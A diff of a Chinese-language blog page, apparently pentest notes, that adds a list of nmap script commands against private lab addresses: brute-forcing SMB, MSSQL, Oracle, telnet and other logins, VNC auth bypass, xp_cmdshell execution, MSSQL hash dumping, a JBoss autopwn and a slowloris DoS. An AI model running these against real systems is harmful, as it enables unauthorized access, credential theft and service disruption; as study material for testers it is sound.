@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">211字</span>
+            <span class="post-count">919字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">4分钟</span>
         </span>
     </span>
 </div>
@@ -110,6 +110,63 @@
 <p><strong>systeminfo 查看系统信息·</strong>··············</p>
 <p><strong>使用CS扩展的Ladon插件探测内网存活主机情况</strong></p>
 <p><strong>net view /domain 查看域情况</strong></p>
+<p>（1）  nmap –script=auth 192.168.137.*</p>
+<p>  　　负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p>
+<p>  　　（2）nmap –script=brute 192.168.137.*</p>
+<p>  　　提供暴力破解的方式  可对 数据库，smb，snmp等进行简单密码的暴力猜解</p>
+<p>  　　（3）nmap –script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</p>
+<p>  　　默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p>
+<p>  　　（4）nmap –script=vuln 192.168.137.*</p>
+<p>  　　检查是否存在常见漏洞</p>
+<p>  　　（5）nmap -n -p445 –script=broadcast 192.168.137.4</p>
+<p>  　　在局域网内探查更多服务开启状况</p>
+<p>  　 　检查vnc bypass</p>
+<p>  　　nmap  –script=realvnc-auth-bypass 192.168.137.4</p>
+<p>  　　(1)检查vnc认证方式</p>
+<p>  　　nmap  –script=vnc-auth  192.168.137.4</p>
+<p>  　　获取vnc信息</p>
+<p>  　　nmap  –script=vnc-info  192.168.137.4</p>
+<p>  　　（2）smb扫描：</p>
+<p>  　　smb破解</p>
+<p>  　　nmap  –script=smb-brute.nse 192.168.137.4</p>
+<p>  　　smb字典破解</p>
+<p>  　　nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
+<p>  　　smb已知几个严重漏</p>
+<p>  　　nmap  –script=smb-check-vulns.nse –script-args=unsafe=1 192.168.137.4</p>
+<p>  　　查看共享目录</p>
+<p>  　　nmap -p 445  –script smb-ls –script-args ‘share=e$,path=,smbuser=test,smbpass=test’ 192.168.137.4</p>
+<p>  　　查看会话</p>
+<p>  　　nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
+<p>  　　系统信息</p>
+<p>  　　nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
+<p>  　　（3）Mssql扫描：</p>
+<p>  　　猜解mssql用户名和密码</p>
+<p>  　　nmap -p1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
+<p>  　　xp_cmdshell 执行命令</p>
+<p>  　　nmap -p 1433 –script ms-sql-xp-cmdshell –script-args  mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user”  192.168.137.4</p>
+<p>  　　（4）dumphash值</p>
+<p>  　　nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username=sa,mssql.password=sa  192.168.137.4</p>
+<p>  　　扫描root空口令</p>
+<p>  　　nmap -p3306 –script=mysql-empty-password.nse 192.168.137.4</p>
+<p>  　　列出所有mysql用户</p>
+<p>  　　nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root 192.168.137.4</p>
+<p>  　　（5） Oracle扫描：</p>
+<p>  　　oracle sid扫描</p>
+<p>  　　nmap –script=oracle-sid-brute -p 1521-1560 192.168.137.5</p>
+<p>  　　oracle弱口令破解</p>
+<p>  　　nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5</p>
+<p>  　　（6）其他一些比较好用的脚本</p>
+<p>  　　nmap –script=broadcast-netbios-master-browser 192.168.137.4  发现网关</p>
+<p>  　　nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.137.4  破解rsync</p>
+<p>  　　nmap –script informix-brute -p 9088 192.168.137.4   informix数据库破解</p>
+<p>  　　nmap -p 5432 –script pgsql-brute 192.168.137.4    pgsql破解</p>
+<p>  　　nmap -sU –script snmp-brute 192.168.137.4       snmp破解</p>
+<p>  　　nmap -sV –script=telnet-brute 192.168.137.4      telnet破解</p>
+<p>  　　nmap –script=http-vuln-cve2010-0738 –script-args  ‘http-vuln-cve2010-0738.paths={/path1/,/path2/}’ <target>  jboss  autopwn</target></p>
+<p>  　　nmap –script=http-methods.nse 192.168.137.4 检查http方法</p>
+<p>  　　nmap –script http-slowloris –max-parallelism 400 192.168.137.4  dos攻击，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections</p>
+<p>  　　nmap –script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4</p>
+<p>  　　nmap –script=smb-brute –script-args=userdb=/tmp/帐号字典.txt,passdb=/tmp/密码字典.txt IP地址 -p 445</p>
 
       
       <!-- reward -->
